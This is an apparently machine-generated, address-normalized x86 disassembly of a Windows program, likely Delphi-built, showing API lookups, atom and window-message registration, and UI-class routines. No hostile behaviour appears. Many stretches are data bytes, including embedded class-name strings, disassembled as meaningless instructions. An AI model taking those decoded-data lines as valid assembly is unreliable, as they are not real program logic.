call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_44cfb8
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44cf9c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44cf9c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_44d0a8
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4036c0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4036c0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4036c0
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4036c0
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_40442c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_40442c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44d130
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44d2a8
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409730
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404480
mov eax [ rw-data ]
call sub_4048dc
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409730
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404480
mov eax [ rw-data ]
call sub_4048dc
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4048dc
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4166dc
mov [ rw-data ] eax
call sub_44cd34
mov dl 0x1
mov eax [ r-xdata ]
call sub_44cb5c
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45f810
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4608f4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_462418
mov ecx r-xdata
mov edx sub_43ee88
mov eax [ r-xdata ]
call sub_41595c
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d2af
lea eax [ ebp - 0x10 ]
call sub_40442c
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_44d318
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44d377
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d37e
retn
mov eax rw-data
call sub_40dabc
call sub_44d0a8
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404f0c
mov eax rw-data
call sub_40442c
mov eax rw-data
call sub_40442c
sub_44d380
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44d406
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d40d
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_44d130
mov eax [ r-xdata ]
call sub_4157d0
mov eax [ r-xdata ]
call sub_415870
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_41581c
sub_44d414
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
aam 0x44
add al ch
aam 0x44
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x2fffbb2c ] dh
aam 0x44
add [ eax ] ah
add [ eax ] al
inc esp
dec edx
inc ecx
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebx + ebx * 8 ] ch
inc esp
add [ eax + 0x6b ] ch
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x1903ffbc ] bl
inc ecx
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add ah cl
0xec300041 0x41
sub_44d490
aam 0xeb
inc ecx
add [ eax - 0x15 ] ch
inc ecx
add [ eax + 0x6c0041eb ] bl
jmp r-xdata
outsb
lea eax [ eax ]
call 0x74519bd
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
push esp
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
outsb
arpl [ ecx + 0x63 ] ax
je r-xdata
jne r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] cl
inc esp
add [ edx - 0x2a ] ah
adc dh dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] bh
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
mov eax eax
je r-xdata
fiadd [ eax + eax + 0x4 ]
out 0x41 al
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
jo r-xdata
inc edx
popad
jae r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
inc esp
add [ ebx ] al
adc [ ecx + eax * 2 + 0x63 ] dl
je r-xdata
add al bl
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x2b ] dh
inc esp
add [ eax ] cl
popad
jae r-xdata
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax - 0x23 ] cl
inc esp
add [ edi + ebx * 8 + 0x44 ] bl
add [ eax + 0x40044de ] bl
add ch bh
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc esp
add [ eax + eax ] bl
add [ eax + ecx * 2 + 0x41 ] ah
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
salc
outsd
jb r-xdata
add [ esi + esi + 0x40 ] dh
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
jo r-xdata
add [ ebp + ebx * 8 + 0x6b680044 ] dh
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
inc eax
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
sub_44d4c3
add [ eax + 0x7c0044dc ] bl
fild [ eax + eax - 0x74 ]
fild [ eax + eax + 0x10 ]
push esp
inc ebx
outsd
outsb
je r-xdata
or [ esp + edx * 2 ] cl
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
inc ebp
jbe r-xdata
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] 0xe800408d
aam 0x44
add [ edi ] al
adc [ ebx + eax * 2 + 0x6f ] dl
outsb
je r-xdata
popad
jae r-xdata
outsb
je r-xdata
push esp
imul ebp [ esi + 0x65 ] 0x74634164
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
jne r-xdata
inc edx
popad
jae r-xdata
add cl [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
or al 0x54
outsb
arpl [ ecx + 0x63 ] ax
je r-xdata
fiadd [ eax + eax + 0x4 ]
out 0x41 al
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
jo r-xdata
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] cl
inc esp
add [ edx - 0x2a ] ah
adc dh dl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x2a ] bh
outsd
outsb
add [ edi ] eax
dec eax
popad
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
mov eax eax
je r-xdata
add al bl
in eax 0x41
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
inc esp
add [ ebx ] al
adc [ ecx + eax * 2 + 0x63 ] dl
je r-xdata
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax - 0x23 ] cl
inc esp
add [ edi + ebx * 8 + 0x44 ] bl
add [ eax + 0x40044de ] bl
add ch bh
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x2b ] dh
inc esp
add [ eax ] cl
popad
jae r-xdata
inc esp
add [ eax + eax ] bl
add [ eax + ecx * 2 + 0x41 ] ah
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
salc
outsd
jb r-xdata
add [ esi + esi + 0x40 ] dh
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
jo r-xdata
add [ ebp + ebx * 8 + 0x6b680044 ] dh
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
inc eax
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
sub_44d6c9
aad 0x44
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebp + ebx * 8 + 0x6b680044 ] dh
inc ecx
add [ 0x6a840041 ] bl
inc ecx
add ah dh
in eax 0x41
add al bl
fiadd [ eax + eax + 0x4 ]
out 0x41 al
add ah bh
out 0x41 al
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax - 0x23 ] cl
inc esp
add [ edi + ebx * 8 + 0x44 ] bl
add [ eax + 0xb0044de ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
xor al 0xd5
inc esp
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
je r-xdata
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ edx + eax * 4 + 0x6b680041 ] cl
inc ecx
add [ edi + esi * 2 + 0x76a40041 ] ah
inc ecx
arpl [ ebp + 0x74 ] si
xor al 0xd5
inc esp
add [ eax ] dl
add bh bh
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080006 ] al
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
fild [ eax + eax - 0x68 ]
fiadd [ eax + eax + 0xb ]
inc esp
add [ edi ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xeb3c0005
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
je r-xdata
add [ eax - 0x2fffbe7d ] dl
add [ ecx ] 0x3c
test [ ecx ] al
xor al 0x7a
inc ecx
add [ ebp + eax * 4 + 0x41 ] ch
popad
je r-xdata
outsb
push ebp
jo r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ eax ] cl
dec edi
aad 0x44
add [ eax ] bl
add bh bh
nop
loopne r-xdata
jbe r-xdata
inc ecx
add [ esi + eax * 4 + 0x41 ] ch
add [ esp + eax * 4 - 0x7783ffbf ] bh
inc ecx
add [ eax + ecx * 4 + 0x540d0041 ] cl
push 0x4374726f
add [ eax + 0x7e ] ch
inc ecx
add ah bh
jg r-xdata
add [ eax - 0x7b ] dh
inc ecx
add [ eax - 0x1bffbe86 ] cl
xchg [ ecx ] al
inc eax
xchg [ ecx ] eax
adc al 0x88
inc ecx
add [ eax ] bh
add [ ecx ] sub_418850
les ecx [ eax - 0x1737ffbf ]
inc esp
add ah dh
add [ ecx ] 0xec
jne r-xdata
inc ecx
lea eax [ eax ]
push eax
fadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
fadd [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
fadd [ eax + eax + 0x30 ]
add [ eax ] al
add ah dl
aas
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
inc ebp
js r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0900
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
push esp
xor al 0x41
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
inc ecx
add ah cl
test [ ecx ] eax
cmp al 0x7c
inc ecx
add [ edi * 2 - 0x79f7ffbf ] al
inc ecx
add [ eax ] bl
xchg [ ecx ] al
push 0xbc00417d
jge r-xdata
cmp al 0x84
inc ecx
add [ edx + edi * 2 ] dh
add [ eax * 4 - 0x7a97ffbf ] dh
inc esp
add [ eax ] al
dec esp
imul esi [ ebx + 0x74 ] 0xd8fcc08b
inc esp
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add [ eax ] dl
dec esp
imul esi [ ebx + 0x74 ] r-xdata
les eax [ eax + 0x41 ]
add [ eax ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xd9240000
inc esp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
push ebx
push 0x4374726f
jne r-xdata
add [ eax + eax * 4 + 0x41 ] dl
add al ch
add [ ecx ] 0x58
add [ ecx ] 0x74
add [ ecx ] 0x6c
xchg [ ecx ] al
mov esp 0x7c004184
mov [ ecx ] al
mov [ eax + 0x540d0041 ] cs
add [ eax ] al
add [ edx ] al
add dh ch
add [ eax ] dh
in al dx
inc ecx
add ah dl
jmp r-xdata
aam 0x44
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + edi ] dl
inc eax
add [ eax - 0x1e ] ch
inc ecx
add [ ecx + edi ] bl
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
mov al [ 0x10000000 ]
jne r-xdata
inc ebx
fiadd [ eax + eax + 0x24 ]
fiadd [ eax + eax - 0x60 ]
add [ eax ] al
jbe r-xdata
out dx al
add [ esi + esi + 0x40 ] dh
add [ edx + 0x44 ] ah
add [ edx - 0x1ae3ffbc ] dh
inc ecx
add [ edx + ebp * 2 - 0x1a0bffbf ] al
inc ecx
add [ eax - 0x15 ] dh
inc ecx
add [ ebx + ebx * 8 - 0x187fffbc ] bl
inc esp
add [ ecx + ebp * 8 ] ch
inc ecx
add [ esi ] dl
inc ecx
add [ esi ] cl
inc ecx
add [ ecx + ebp * 8 ] dh
inc ecx
add [ eax ] dl
loop r-xdata
add [ eax + 0x36 ] bl
inc eax
outsb
je r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
jmp r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
nop
mov al [ 0x44d9 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
fld [ eax + eax + 0x38 ]
fiadd [ eax + eax ]
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x640040 ] ch
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
js r-xdata
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
jl r-xdata
add [ eax ] al
add al [ eax ]
sub_44d9d7
add [ eax - 0x15 ] ch
inc ecx
add [ eax + 0x6c0041eb ] bl
jmp r-xdata
or eax 0x73754354
je r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
cmp dl bl
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
add [ edx + ebp * 8 - 0x1577ffbf ] dh
inc ecx
add [ eax - 0x47ffbe16 ] bh
jmp 0xffffffffea90db03
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0xe9fc0041 0x41
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov al [ 0xffffffffe40044d9 ]
aam 0x44
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xdaa80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
fild [ eax + eax + 0x18 ]
add [ eax ] al
add ah al
dec ecx
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
sub_44da1a
out dx eax
dec esp
out 0x44 eax
add ah dh
out 0x44 eax
add [ 0x73754354 ] cl
je r-xdata
inc eax
add [ eax + 0x36 ] bl
inc eax
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
cmp dl bl
inc esp
add [ edi ] al
or eax 0x73754354
je r-xdata
add [ edx + ebp * 8 - 0x1577ffbf ] dh
inc ecx
add [ eax - 0x47ffbe16 ] bh
jmp 0xffffffffea90db03
add [ esi + esi + 0x40 ] dh
add [ eax ] al
0xe9fc0041 0x41
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov al [ 0xffffffffe40044d9 ]
aam 0x44
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0xdaa80000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
fild [ eax + eax + 0x18 ]
add [ eax ] al
add ah al
dec ecx
inc ecx
add [ eax ] cl
cmp [ eax ] eax
adc al 0x39
inc eax
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
sub_44db2c
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41eb10
test bl bl
jle r-xdata
mov edx esi
call sub_44df40
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_44db9c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41e604
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_44dc44
sub_44dbd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44db60
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_416090
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_41621c
sub_44dc18
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404828
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_404480
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_44dc44
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_44df40
mov edx ebx
mov eax esi
call sub_44df20
sub_44dc6c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44dc44
sub_44dc98
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463168
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4038bc
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41eb9c
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_43ecb4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44dcf0
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_463190
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4038bc
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41ebb8
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_43ecb4
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44dd48
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41e1a4
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44decc
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_44ddb4
push ebx
push esi
push edi
call sub_403a8c
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4036c0
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_416288
call sub_4036c0
mov eax [ edi + 0x30 ]
call sub_4036c0
mov edx ebx
and dl 0xfc
mov eax edi
call sub_41e1f0
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_403a74
sub_44de04
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_44de4c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4161fc
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov edx edi
call sub_44dbd0
sub_44de98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_44fc00
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_41e274
sub_44ded8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_41e4c0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
